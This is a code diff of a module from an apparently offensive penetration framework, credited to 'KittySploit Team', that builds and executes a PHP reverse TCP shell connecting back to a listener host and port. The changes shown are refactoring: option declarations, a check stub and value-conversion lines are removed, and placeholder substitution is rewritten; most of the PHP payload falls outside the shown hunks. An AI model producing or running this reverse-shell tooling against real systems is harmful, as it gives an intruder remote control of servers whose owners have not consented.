@@ -6,15 +6,9 @@ class Module(Post, Reverse):
 	__info__ = {
 		"name": "Reverse TCP shell",
 		"description": "Reverse TCP shell in PHP using a reverse handler",
+		"author": "KittySploit Team",
 		"arch": Arch.PHP,
 	}
-	
-	lhost = OptString("127.0.0.1", "Local host to listen on", required=True)
-	lport = OptPort(4444, "Local port to listen on", required=True)
-	
-	def check(self):
-		"""Check if target is vulnerable"""
-		return True
 		
 	def run(self):
 		# Start reverse handler
@@ -25,9 +19,6 @@ class Module(Post, Reverse):
 		import time
 		time.sleep(1)
 		
-		# Use raw f-string to preserve PHP braces while allowing variable substitution
-		lhost_val = str(self.lhost.value) if hasattr(self.lhost, 'value') else str(self.lhost)
-		lport_val = int(self.lport.value) if hasattr(self.lport, 'value') else int(self.lport)
 		
 		data = rf"""
       @error_reporting(0);
@@ -143,8 +134,8 @@ class Module(Post, Reverse):
 
 """
 		# Replace placeholders with actual values
-		data = data.replace("LHOST_PLACEHOLDER", lhost_val)
-		data = data.replace("LPORT_PLACEHOLDER", str(lport_val))
+		data = data.replace("LHOST_PLACEHOLDER", self.lhost)
+		data = data.replace("LPORT_PLACEHOLDER", str(self.lport))
 		
 		# Execute PHP code
 		print_info("Executing reverse shell payload...")
